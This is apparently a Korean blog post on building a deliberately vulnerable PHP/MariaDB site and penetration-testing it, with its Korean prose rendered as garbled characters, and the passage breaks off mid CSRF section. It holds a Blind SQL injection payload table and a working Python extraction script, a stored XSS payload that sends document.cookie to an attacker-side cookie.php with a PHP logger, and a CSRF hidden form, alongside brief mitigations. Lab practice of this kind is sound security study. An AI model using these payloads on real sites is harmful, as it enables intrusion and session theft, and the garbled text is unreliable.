---
layout: post
title:  " ๐ ๋ชจ์ํดํน ์ฌ์ดํธ ๊ตฌ์ถ & ์น ์นจํฌ ํ์คํธ"
date:   2021-09-04 15:54:50 +0700
categories: "๋ชจ์ํดํน"
tags: [ PHP, Mariadb, XSS, CSRF, Web Shell. Directory Listing, Blind SQL Injection]
description: ๋ชจ์ํดํน ์ฌ์ดํธ๋ฅผ ํตํด "
image: "https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fbw6sV1%2FbtrdXyoL4dZ%2F4ONeRfPX5ru7YKnRFLldik%2Fimg.png"
---
# 0. ๋ชฉ์ฐจ
1. ๊ฐ์<br>1.1 ์ฌ์ดํธ ๋ชฉ์ 
2. ํ๊ฒฝ ๊ตฌ์ถ
3. ์น ์๋น์ค ์์
4. ์ทจ์ฝ์  ์ ๊ฒ
<br>4.1 Blind SQL Injection
<br>4.2 XSS
<br>4.3 CSRF
<br>4.4 Web Shell
<br>4.5 Directory Listing
5. ํ๋ก์ ํธ ๊ฒฐ๊ณผ
6. ์ฐธ๊ณ ์๋ฃ

# 1. ๊ฐ์
<mark>CIA ํ๋ก์ ํธ</mark>
<br>ํ๋ก์ ํธ์ ์ด๋ฆ์ธ CIA๋  ๋ณด์์ 3์์ (`๊ธฐ๋ฐ์ฑ, ๋ฌด๊ฒฐ์ฑ, ๊ฐ์ฉ์ฑ`) ์์ ๊ฐ์ ธ์๋ค.  
CIA ํ๋ก์ ํธ๋ LAMP๋ฅผ ๊ธฐ๋ฐ์ผ๋ก ์น ๋ชจ์ํดํน ์ง๋จ์ ์ํ์ฌ ๊ฐ์์ ์ปค๋ฎค๋ํฐ ์ฌ์ดํธ `๊ตฌ์ถ` ํ์ฌ, ๋ชจ์ ์นจํฌ ํ์คํธ๋ฅผ ํตํด `์ทจ์ฝ์ `๋ฅผ ์ง๋จํฉ๋๋ค.

<!-- CIA Web Sites๋ php, mariadb์ ์ทจ์ฝ์ ์ ๊ณ ๋ คํด์ผ ํ  ์ธก๋ฉด์ ๋ํด ์ค๋ชํฉ๋๋ค. -->
<hr>

## 1.1 ์ฌ์ดํธ ๋ชฉ์ 

์น ์ฌ์ดํธ๋ฅผ ์ง์  `๊ฐ๋ฐ`ํ์ฌ `์ทจ์ฝํ ์ฝ๋`๋ฅผ ๋ ์์ธํ ์ ์ ์์ผ๋ฉฐ,
<br>์น ๊ฐ๋ฐ์ ์ทจ์ฝ์ ์ด ์ด๋์ ์ด๋ค ๋ฐฉ์์ผ๋ก ์ทจ์ฝ์ ์ด ๋ฐ์ํ๋์ง ์ธ๋ฐํ๊ฒ ๊ด์ฐฐํ๋ฉฐ, ๊ด์ฐฐํ ๋ด์ฉ์ ํ ๋๋ก `์ ๊ฒ`ํ  ์ ์์ต๋๋ค.

<hr>

# 2. ํ๊ฒฝ ๊ตฌ์ถ

`LAMP` / `Centos7` `Apache/2.4.6` `5.5.68-MariaDB` `PHP 5.4.16`
<br>L: Linux (์ด๋ฒ wordpress๋ CentOS 7์์ ์งํํฉ๋๋ค.)
<br>A: Apache ์น ์๋ฒ
<br>M: MySQL ๋๋ MariaDB
<br>P: PHP

<hr>

# 3. ์น ์๋น์ค ์์
<figure>
<img src="https://blog.kakaocdn.net/dn/bkruN7/btrdIT9gJ6b/xykMYzf4btPjli943XAaJ1/img.gif" alt="Weather API Web Sites">
<figcaption>Fig 1. Check app service</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fo67bb%2FbtrdK6fJvEZ%2FXx8OuQBTKafvh2biifknxk%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 2. Main.</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FckMpKL%2FbtrdKWqymEv%2F1zhejUXiCkITnzd3PgKm5k%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 3. Login.</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F0FIsA%2FbtrdHf59G0q%2FlpOiKb00MDe26eAchra7Kk%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 4. Register.</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FGi58T%2FbtrdOM1J3fH%2FkZ1ltqKFCVkKFFK8kx1a41%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 5. MyPage.</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbAbeJB%2FbtrdHfSxI9c%2FXlgsK5dP2CB8FRy5DzPea1%2Fimg.png" alt="Weather API Web Sites - Main">
<figcaption>Fig 6. Board.</figcaption>
</figure>

<hr>

## 4. ์ทจ์ฝ์  ์ ๊ฒ

## 4-1 <sup id="sql">[[1]](#user-ref)</sup>Blind SQL Injection
1. ์ฟผ๋ฆฌ์ ๊ฒฐ๊ณผ๋ฅผ `์ฐธ๊ณผ ๊ฑฐ์ง`์ผ๋ก๋ง ์ถ๋ ฅํ๋ ํ์ด์ง์์ ์ฌ์ฉํ๋ ๊ณต๊ฒฉ์ด๋ค.
2. ์ถ๋ ฅ ๋ด์ฉ์ด ์ฐธ / ๊ฑฐ์ง ๋ฐ์ ์์ด์ ๊ทธ๊ฒ์ ์ด์ฉํ์ฌ ๋ฐ์ดํฐ๋ฒ ์ด์ค์ ๋ด์ฉ์ ์ถ์ธกํ์ฌ `์ฟผ๋ฆฌ๋ฅผ ์กฐ์`ํ๋ค.

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fx1H93%2FbtqG9ST9EIX%2FX85GJhTbLbt2mkNoXKDm90%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 1. ๊ณต๊ฒฉ ํ๋ฆ๋</figcaption>
</figure>


์ ๋ Blind SQL Injection ์ค์์ <sup id="based">[[2]](#user-ref2)</sup>`Bollean Based`๋ฅผ ์ด์ฉํ์ฌ ๊ฒ์ํ์์ ๊ณต๊ฒฉํด๋ณด๋๋ก ํ๊ฒ ์ต๋๋ค. 

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcCuU4T%2FbtrdINH8TL7%2F9gSyq4SRaKNwAxpPcouqTk%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 2. ๊ฒ์ํ (1/3)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FnZapi%2FbtrdIUgmVE2%2FfkKFHR0HCd892bXtCJGKyK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 3. ๊ฒ์ํ - ๊ฒ์ (2/3)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcxfDqV%2FbtrdJ4v5chs%2FxECzsjawEDzK2EWitiJle0%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 4. ๊ฒ์ํ - ์ฟผ๋ฆฌ๋ก๊ทธ (3/3)</figcaption>
</figure>

<figure>
<div class="overflow-table" markdown="block">

|      ์ข๋ฅ                | ์ฃผ์                               |
| :---------------------- | :--------------------------------- |
| `MySQL` | `#` |
| `MSSQL, Oracle, Sabase ASE, DB2`           | `--`               |
| `MariaDB`           | `--, #`       |
| `Sybase IQ`           | `--, //, %`       

</div>
<figcaption>์ฟผ๋ฆฌ ๊ณต๊ฒฉ์ ์ํ ์ฃผ์ ํ์ด๋ธ</figcaption>
</figure>

```sql
$ select * from board where title like '%2 'or 1=1#%' order by idx desc
$ 2 'or 1=1#
```
<figcaption>Boolean Based Sql - ์ทจ์ฝ์  ํ์ธ</figcaption>

์  ์์ ์ฃผ์ ๋ฐ ์ทจ์ฝ์  ํ์ธ ๋ฐฉ์์ ์ด์ฉํ์ฌ `์ฟผ๋ฆฌ ๊ณต๊ฒฉ` ๊ตฌ๋ฌธ์ด ํญ์ ์ฐธ์ด ๋๊ฒ ํ์ฌ ๊ณต๊ฒฉ์ด ๋จนํ๋์ง ํ์ธํด๋ณด๋๋ก ํ๊ฒ ์ต๋๋ค.

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FW4D69%2FbtrdPJqu6pN%2FKdIpyMCE0SpiE9yKYpU3u0%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 5. ๊ฒ์ํ ๊ณต๊ฒฉ ํ์ธ (1/3)</figcaption>
</figure>
_________________________________________________
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fo2i2K%2FbtrdMKqrgVx%2F6VyJYyFf8oKD3g4J3A7IBK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 5. ๊ฒ์ํ ๊ณต๊ฒฉ ํ์ธ (2/3)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbnIjvs%2FbtrdJjUFuoJ%2FVDwqlSqNRLYwqzaIhZIFvK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 6. ๊ฒ์ํ -๊ณต๊ฒฉ ํ์ธ (3/3)</figcaption>
</figure>

์ฟผ๋ฆฌ ๊ณต๊ฒฉ๊ตฌ๋ฌธ์ด ์ฑ๊ณตํ์ฌ `ํญ์ ์ฐธ`์ด ๋๋ `๊ฒฐ๊ณผ๊ฐ`์ ๋ณผ ์ ์์์ต๋๋ค.
๊ทธ๋์ ์ ๋ ์๋ ๋ฐฉ์์ผ๋ก `๋ฐ์ดํฐ๋ฒ ์ด์ค ์ด๋ฆ`, `ํ์ด๋ธ ์ด๋ฆ`, `ํ์ด๋ธ์ ์ปฌ๋ผ` ๋ฑ๋ฑ๋ฅผ ๊ฐ์ ธ์์ต๋๋ค.
<br>
<figure>
<div class="overflow-table" markdown="block">

|      ์ข๋ฅ                | ๊ณต๊ฒฉ ๊ตฌ๋ฌธ                               |
| :---------------------- | :--------------------------------- |
| `๋ฐ์ดํฐ๋ฒ ์ด์ค ๊ธธ์ด` | `1' and length(database()) > 2#` |
| `๋ฐ์ดํฐ๋ฒ ์ด์ค ์ด๋ฆ`           | `1' and substring(database(),1,1)='c'#, 1' and substring(database(),2,1)='i'#`               |
| `CIA ๋ฐ์ดํฐ๋ฒ ์ด์ค ํ์ด๋ธ ๊ธธ์ด`           | `1' and length((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0,1))=5#, 1' and length((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 1,1))=10#`       |
| `CIA ๋ฐ์ดํฐ๋ฒ ์ด์ค ํ์ด๋ธ ์ด๋ฆ`           | `1' and (select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0, 1) = 'board'#,1' and substring((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0,1),1,1) = 'b'#, 1' and (select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 2, 1) = 'member'#`
| `CIA ๋ฐ์ดํฐ๋ฒ ์ด์ค ํ์ด๋ธ ์ปฌ๋ผ ๊ธธ์ด`           | `1' and length((select column_name from information_schema.columns where table_name='member' limit 0,1))=3#, 1' and length((select column_name from information_schema.columns where table_name='member' limit 1,1))=2#`
| `CIA ๋ฐ์ดํฐ๋ฒ ์ด์ค ํ์ด๋ธ ์ปฌ๋ผ ์ด๋ฆ`           | `1' and substring((select column_name from information_schema.columns where table_name='member' limit 0,1),1,1) = 'i'#, 1' and substring((select column_name from information_schema.columns where table_name='member' limit 0,1),2,1) = 'd'#`
| `์์ด๋ ๊ฐ์ ธ์ค๊ธฐ`           | `1' and (select idx from member where id='veloideu')#, 1' and (select id from member limit 6,1)='qwe'#`
| `ํจ์ค์๋ ๊ธธ์ด ๊ฐ์ ธ์ค๊ธฐ`           | `1' and length((select pw from member where id='veloideu'))=60#`
| `ํจ์ค์๋ ์ํธํ ๋ฐฉ์ ํ์ธ`           | `1' and sha1("123")=(select pw from member where id='veloideu')#`

</div>
<figcaption>์ฟผ๋ฆฌ ๊ณต๊ฒฉ์ ์ํ ๊ณต๊ฒฉ ๊ตฌ๋ฌธ ํ์ด๋ธ</figcaption>
</figure>

```python
import requests
from bs4 import BeautifulSoup
import string

comparison = string.ascii_lowercase

db_name ="    DB ์ด๋ฆ : "
table_name =" Table ์ด๋ฆ : "
Column_name ="Column ์ด๋ฆ : "
Member_name ="Member ์ด๋ฆ : "

for b in range(1, 4): # DB ์ด๋ฆ : 1' and substring(database(),{b},1)='{i}'%23
    for i in comparison:
        url = f"http://192.168.35.237/page/board/search_result.php?catgo=title&search=1' and substring(database(),{b},1)='{i}'%23"
        response = requests.get(url)
        response_text = response.text
        soup = BeautifulSoup(response_text, 'html.parser')
        title = soup.select_one('#board_area > table > tbody > tr > td:nth-child(2) > a > span:nth-child(1)')

        if title != None:
            db_name += i
        else :
            pass

for a in range(1, 6): # Table ์ด๋ฆ : 1' and substring((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0,1),{a},1) = '{b}'%23
    for b in comparison:

        url = f"http://192.168.35.237/page/board/search_result.php?catgo=title&search=1' and substring((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0,1),{a},1) = '{b}'%23"
        response = requests.get(url)
        response_text = response.text
        soup = BeautifulSoup(response_text, 'html.parser')
        title = soup.select_one('#board_area > table > tbody > tr > td:nth-child(2) > a > span:nth-child(1)')

        if title != None:
            table_name += b
        else :
            pass

for a in range(1, 3):
    for b in comparison: # Column ์ด๋ฆ : 1' and substring((select column_name from information_schema.columns where table_name='member' limit 1,1),{a},1) = '{b}'%23

        url = f"http://192.168.35.237/page/board/search_result.php?catgo=title&search=1' and substring((select column_name from information_schema.columns where table_name='member' limit 1,1),{a},1) = '{b}'%23"
        response = requests.get(url)
        response_text = response.text
        soup = BeautifulSoup(response_text, 'html.parser')
        title = soup.select_one('#board_area > table > tbody > tr > td:nth-child(2) > a > span:nth-child(1)')

        if title != None:
            Column_name += b
        else :
            pass

for a in range(1, 6):
    for b in comparison: # Member ์ด๋ฆ : ' and substring((select id from member limit 1,1),{a},1)='{b}'%23"

        url = f"http://192.168.35.237/page/board/search_result.php?catgo=title&search=1' and substring((select id from member limit 1,1),{a},1)='{b}'%23"
        response = requests.get(url)
        response_text = response.text
        soup = BeautifulSoup(response_text, 'html.parser')
        title = soup.select_one('#board_area > table > tbody > tr > td:nth-child(2) > a > span:nth-child(1)')

        if title != None:
            Member_name += b
        else :
            pass


print(db_name)
print(table_name)
print(Column_name)
print(Member_name)
```
<figcaption>Fig 7. ์ฟผ๋ฆฌ ๊ณต๊ฒฉ ์คํฌ๋ฆฝํธ (1/3)</figcaption>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbybK40%2FbtrdPJTgRVU%2Fs9GCSyvkkn8qAjhOVye32K%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 8. ์ฟผ๋ฆฌ ๊ณต๊ฒฉ ์คํฌ๋ฆฝํธ (2/3)</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbXLWXs%2FbtrdPItm9Cx%2FMikd0xUGgLSJYMKa82b8ik%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 9. ์ฟผ๋ฆฌ ๊ณต๊ฒฉ ์คํฌ๋ฆฝํธ (3/3)</figcaption>
</figure>

์ ๋ ์๊ฐ์ ๋จ์ถํ๊ธฐ ์ํด ์์ 7~9๋ฒ ์ฌ์ง์ฒ๋ผ ๊ณต๊ฒฉ ์คํฌ๋ฆฝํธ `ํ์ด์ฌ`์ ์ด์ฉํ์ฌ ์์ฑ ํ ๊ณต๊ฒฉํ์ฌ `์ํ๋ ๊ฒฐ๊ณผ๊ฐ`์ ์ป์ ์ ์์์ต๋๋ค.

#### ๋์ ๋ฐฉ์
ํ์ฌ ๊ณต๊ฒฉ์ด ๊ฐ๋ฅํ ๋ถ๋ถ์ ๊ฒ์ํ ๊ฒ์์ด ๊ฐ๋ฅํ ๋ถ๋ถ ๋ฐ `SQL ๊ณต๊ฒฉ ๊ตฌ๋ฌธ์ด` ๊ฐ๋ฅํ ๋ถ๋ถ์๋๋ค.
<br>๊ฒ์ํ์์ ๊ฒ์์ ํ ๋ `์๋ ฅ๊ฐ์ ์ ํจ์ฑ ๊ฒ์ฌ`๋ฅผ ์ํด์ `Bollean Based ๊ณต๊ฒฉ`์ด ๋๊ณ  ์์ต๋๋ค.
<br>์ด๋ฅผ ๋ณด์ํ๊ธฐ ์ํด์๋ DBMS ์ข๋ฅ์ ๋ฐ๋ผ `์ฟผ๋ฆฌ์ ๊ตฌ์กฐ`๋ฅผ `๋ณ๊ฒฝ`์ํค๊ฑฐ๋, ์ฟผ๋ฆฌ๋ฌธ์ ์ผ๋ถ๋ก ์ฌ์ฉ๋๋ ๋ฌธ์๋ฅผ `๊ณต๋ฐฑ` ๋ฑ์ผ๋ก `์นํ`ํ๋ ๋ฐฉ์์ผ๋ก ๋ฐฉ์ด๋ฅผ ํ๋ฉด ๋ฉ๋๋ค.
(`ํน์๋ฌธ์:', =, #, -- / ๊ณต๊ฒฉ ๊ตฌ๋ฌธ์ ์ฌ์ฉ๋ database, select ๋ฑ๋ฑ`)

<br>


 <hr>
## 4-2 <sup id="xss">[[3]](#user-ref3)</sup> `XSS` `: Cross Site Scripting`

 1. ์ฌ์ดํธ๋ฅผ `๊ต์ฐจ`ํด์ ์คํฌ๋ฆฝํธ๋ฅผ ๋ฐ์์ํด.
 2. ๊ฒ์ํ์ ํฌํจํ ์น์์ `์๋ฐ์คํฌ๋ฆฝํธ`๊ฐ์ ์คํฌ๋ฆฝํธ ์ธ์ด๋ฅผ ์ฝ์ํด ๊ฐ๋ฐ์๊ฐ ์๋ํ์ง ์์ ๊ธฐ๋ฅ์ ์๋์ํค๋๊ฒ.
 3. `ํด๋ผ์ด์ธํธ์ธก`์ ๋์์ผ๋ก ํ ๊ณต๊ฒฉ

์  ์ฌ๊ธฐ์ `Stored XSS` (์น ์ฌ์ดํธ `๊ฒ์ํ`์ ์คํฌ๋ฆฝํธ๋ฅผ `์ฝ์`ํ๋ ๊ณต๊ฒฉ ๋ฐฉ์)๋ฅผ ์ด์ฉํด๋ณด๋๋ก ํ๊ฒ ์ต๋๋ค.

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fb3uWBk%2FbtrdT1MevqC%2FAy2bksolFQoHa6cPfYcnkK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 10. XSS ๊ฒ์ํ ํ์คํธ (1/4)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FmZVZt%2FbtrdVjr5UXJ%2FcQCJOVYYJICHXUZ3Pdekk0%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 11. XSS ๊ฒ์ํ ํ์คํธ (2/4)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbBKi3M%2FbtrdXxwDCZe%2FxzYIAUg3RR2nHzR3kclFUK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 12. XSS ๊ฒ์ํ ํ์คํธ (3/4)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F6BdJD%2FbtrdPJFN1Df%2F1k97aP2ciiQ5KkhoUlqQsk%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 13. XSS ๊ฒ์ํ ํ์คํธ (4/4)</figcaption>
</figure>

```javascript
$ <script>alert("๋ด์ฉ ")</script>
```
<figcaption>Javascript๋ฅผ ์ด์ฉํ XSS ์ทจ์ฝ์  ํ์ธ ์ฝ๋</figcaption>
XSS ๊ณต๊ฒฉ์ด ๊ฐ๋ฅํ๊ฒ์ด ํ์ธ์ด ๋์ด, ์  XSS ๊ณต๊ฒฉ์ผ๋ก `์ฟ ํค๊ฐ`์ `ํ์ทจ`ํด๋ณด๋๋ก ํ๊ฒ ์ต๋๋ค.
<br>
<br>
```javascript
<script>window.open("http://192.168.35.237/xss/cookie.php?data="+document.cookie)</script>
```
<figcaption>XSS ๊ณต๊ฒฉ ์ฝ๋ (1/2)</figcaption>

```php
<?php
	$cookie=$_GET['data'];
	$atime=date("y-m-d H:i:s");
	$log=fopen("data.txt","a");
	fwrite($log, $atime." ".$cookie."\r\n");
	fclose($log);
	echo "<img src=hacker.png></img>";
?>
```
<figcaption>XSS ๊ณต๊ฒฉ ์ฝ๋ (2/2)</figcaption>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FmZVZt%2FbtrdVjr5UXJ%2FcQCJOVYYJICHXUZ3Pdekk0%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 14. XSS๋ฅผ ์ด์ฉํ ์ฟ ํค ๊ฐ ํ์ทจ (1/4)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fbw6sV1%2FbtrdXyoL4dZ%2F4ONeRfPX5ru7YKnRFLldik%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 15. XSS๋ฅผ ์ด์ฉํ ์ฟ ํค ๊ฐ ํ์ทจ (2/4)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FkIJG0%2FbtrdVOFoSlq%2FD6rOTBvXMimWLCog6FAjUk%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 16. XSS๋ฅผ ์ด์ฉํ ์ฟ ํค ๊ฐ ํ์ทจ  (3/4)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbjtDK9%2FbtrdOWFuPWh%2FkPFff5I2EmArUEwgNNGVC0%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 17. XSS๋ฅผ ์ด์ฉํ ์ฟ ํค ๊ฐ ํ์ทจ (4/4)</figcaption>
</figure>

๊ฒ์๊ธ์ ์ฝ๋ ์ฌ๋์ `ํด์ปค`์ ์น ์๋ฒ์ `cookie.php`๋ฅผ ์ฝ๊ณ  `์ฟ ํค๊ฐ์ด ํ์ทจ` ๋๋ฉฐ, ์ฌ์ง ์ฐฝ์ด ๋์ด์ง๋๋ก ํ์๊ณ , `fopen`์ ํตํ์ฌ ํด์ปค `data.txt`์ ์๊ฐ, ์ฟ ํค๊ฐ์ `์ ์ฅ`ํ๋๋ก ํ์์ต๋๋ค.
<br>
#### ๋์ ๋ฐฉ์
ํ์ฌ ๊ณต๊ฒฉ์ด ๊ฐ๋ฅํ ๋ถ๋ถ์ ๊ฒ์ํ์์ `๊ธ์ ์ธ๋, ๋๊ธ์ ์ธ๋`XSS๊ณต๊ฒฉ์ด ๊ฐ๋ฅํฉ๋๋ค.
<br>XSS ๊ณต๊ฒฉ์ด ๊ฐ๋ฅํจ์ ๋ฐ๋ผ Stored XSS๋ฅผ ์ด์ฉํ์ฌ `์ฌ์ฉ์์ ์ฟ ํค๊ฐ์ด ๋ธ์ถ`๋๊ณ  ์์ต๋๋ค.
<br>์ด๋ฌํ ์ํฉ์ ๋ฐฉ์ดํ๊ธฐ ์ํด์๋ `์ ํจ์ฑ ๊ฒ์ฌ`๋ฅผ ํตํด <script ํ๊ทธ, ํ๊ทธ ๋ฌธ์(<,>,",')๋ฅผ `์ด์ค์ผ์ดํ` ํ๋ค.
<br>(`ํ๊ทธ๋ฌธ์ : <(&lt), >(&gt), "(&quot), '(&apos), &(&amp) ๋ฑ๋ฑ`)

<hr>
## 4-3 <sup id="csrf">[[4]](#user-ref4)</sup> `CSRF` `: Cross Site Request Forgery`

1. XSS์ `๋์ผํ ์๋ฆฌ`๋ก ๊ฒ์ํ, ์ด๋ฉ์ผ ๋ฑ ์ปจํ์ธ ์ `์์ฑ ์คํฌ๋ฆฝํธ` ๋๋ HTML ํ๊ทธ ์ฝ์
2. ์ฌ์ฉ์ ์ธก ๋ธ๋ผ์ฐ์ ์์ `์ฝ์๋ ์คํฌ๋ฆฝํธ` ๋๋ HTML ํ๊ทธ๊ฐ ์คํ๋จ
3. ๊ณต๊ฒฉ์๊ฐ ์๋ํ ํ์(CRUD)๊ฐ ์๋ ์์กฐ๋ HTTP ์์ฒญ์ด `๊ฐ์ ๋ก ์ํ`๋จ

์ด๋ฒ์๋ `๊ฒ์ํ`์ ํตํด `CSRF` ๊ณต๊ฒฉ์ด ๊ฐ๋ฅํ์ง ํ์ธํด๋ณด๊ฒ ์ต๋๋ค.

<br>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbxVhRr%2FbtrdVPlGK5Z%2FG59Lv2gPNdTIIkPTyglQpk%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 18. ๊ฒ์๊ธ ํจํท ๋ถ์ (1/3)</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F15Zjf%2Fbtrd0XQw9r0%2FJtuLiwvfqqTBOOtY587gkK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 19. ๊ฒ์๊ธ ํจํท ๋ถ์ (2/3)</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FsaO9N%2FbtrdU7fQQUU%2FVTQ6Aj0CaiHgdslA9sTL3K%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 20. ๊ฒ์๊ธ ํจํท ๋ถ์ (3/3)</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FrQLTg%2Fbtrd1PYL6CG%2FlK74dFguapKV2iHcnq6GGK%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 21. CSRF ๊ณต๊ฒฉ (1/5)</figcaption>
</figure>
<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FdEShRj%2Fbtrd0FP2nhS%2FDKe5Ym570B6kmEXkyCJgZ1%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 22. CSRF ๊ณต๊ฒฉ (2/5)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbTqeo6%2FbtrdZWY3t4y%2Fh8vhOpqTHDNuqqEaxFKrr1%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 23. CSRF ๊ณต๊ฒฉ (3/5)</figcaption>
</figure>

<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FnjcZj%2Fbtrd0j7DLvl%2F9l6bh7yhypvQneq2pgAYU0%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 24. CSRF ๊ณต๊ฒฉ (4/5)</figcaption>
</figure>


<figure>
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fcfzeit%2Fbtrd0yQ1pbK%2FprkYS2kdkltrIsvTN8xX0K%2Fimg.png
" alt="Weather API Web Sites - Main">
<figcaption>Fig 25. CSRF ๊ณต๊ฒฉ (5/5)</figcaption>
</figure>

```php
<form name="write_form" action="write_ok.php" method="post" enctype="multipart/form-data" target="A">
<input type="hidden" name="title" value="CSRF ์๋ ๊ธ"> 
<input type="hidden" name="content" value="test">
<input type="hidden" name="lockpost" value="1" >
<input type="file" name="imgFile" style="display:none;"> 
</form>
